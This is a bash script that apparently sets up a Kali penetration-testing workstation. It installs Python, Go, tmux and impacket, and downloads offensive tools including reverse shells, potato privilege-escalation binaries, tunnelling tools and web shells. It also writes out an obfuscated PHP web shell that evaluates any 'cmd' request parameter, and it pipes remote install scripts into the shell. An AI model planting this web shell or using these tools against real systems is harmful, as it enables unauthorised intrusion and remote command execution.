#!/bin/bash
set +e

# Python2 pip
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
clear
sleep 3

# Pip2 and pip3
pip3 install --upgrade setuptools && python3 -m pip install --upgrade pip && pip2 install --upgrade setuptools && python2 -m pip install --upgrade pip
clear
echo -e "\nPip2 and pip3 are upgraded\n"
sleep 3
# pyenv
curl https://pyenv.run | bash

sleep 2
cat >> ~/.zshrc <<-'EOF'
export PATH="$HOME/.pyenv/bin:$PATH"
eval "$(pyenv init -)"
eval "$(pyenv virtualenv-init -)"
export PYENV_VIRTUALENV_DISABLE_PROMPT=1
EOF



sleep 2
#go
sudo apt-get install -y golang
clear
sleep 2

echo 'export GOPATH=$HOME/go' >> ~/.zshrc
echo 'export GOROOT=/usr/lib/go' >> ~/.zshrc
echo 'export PATH=$PATH:$GOROOT/bin/:$GOPATH/bin' >> ~/.zshrc
source ~/.zshrc
clear

#tmux
sleep 2
cat > ~/.tmux.conf <<-'EOF'
#tmux attach 如果无分离终端则新建
new-session
# split panes using | and -
bind | split-window -h
bind - split-window -v
unbind ' " '
unbind %
bind -r k select-pane -U # 绑定k为↑
bind -r j select-pane -D # 绑定j为↓
bind -r h select-pane -L # 绑定h为←
bind -r l select-pane -R # 绑定l为→
set -g mouse on
# reload config file (change file location to your the tmux.conf you want to use)
bind r source-file ~/.tmux.conf; display-message "Config reloaded.."
bind V source-file ~/.tmux/layout1         #ctrl b + shift v => change
EOF

mkdir ~/.tmux
sleep 1
cat > ~/.tmux/layout1 <<-'EOF'
selectp -t 0 # select the first (0) pane
splitw -v -p 50 # split it into two halves
selectp -t 1 # select the new, second (1) pane
splitw -h -p 50 # split it into two halves
selectp -t 0 # go back to the first pane
EOF
sleep 2

clear

#ad
go install github.com/ropnop/kerbrute@latest

#binary
mkdir -p Tools/linux && cd Tools/linux
sleep 3
wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
sleep 2
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_386.gz
cd ../
mkdir ad&&cd ad
git clone https://github.com/urbanadventurer/username-anarchy.git
git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
cd ../
mkdir windows && cd windows
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
wget https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
cd ../
mkdir webshell && cd webshell
wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
wget https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-linux-x64.zip
unzip AntSword-Loader-v4.0.3-linux-x64.zip
rm -rf AntSword-Loader-v4.0.3-linux-x64.zip
mv AntSword-Loader-v4.0.3-linux-x64 AntSword
echo "<?php class G16f8j67 { public function __construct($H6nC8){ @eval("/*Z5934A463v*/".$H6nC8.""); }}new G16f8j67($_REQUEST['cmd']);?>" > ant.php
sleep 2
clear
sleep 2
pip install bloodyAD
echo "export PATH="$PATH:/home/kali/.local/bin"" >> ~/.zshrc
clear
sleep 1
# impacket
pyenv install 3.8.18
sleep 2
pyenv virtualenv 3.8.18 impacket
sleep 2
pyenv activate impacket
sleep 2
git clone https://github.com/ThePorgs/impacket/ 
cd impacket
pip3 install -r requirements.txt 
python3 setup.py install

clear
sleep 2
cat >> ~/.zshrc <<-'EOF'
export PATH="$PATH:/home/kali/.pyenv/versions/impacket/bin"
EOF

sleep 2
clear
curl -fsSL https://raw.githubusercontent.com/zimfw/install/master/install.zsh | zsh
clear
cd ~
echo "alias cl="clear"" >> .zshrc
echo "alias impacket="clear"pyenv activate impacket" >> .zshrc
echo "alias deactivate="source deactivate"" >> .zshrc
echo "alias cme="crackmapexec"" >> .zshrc
clear
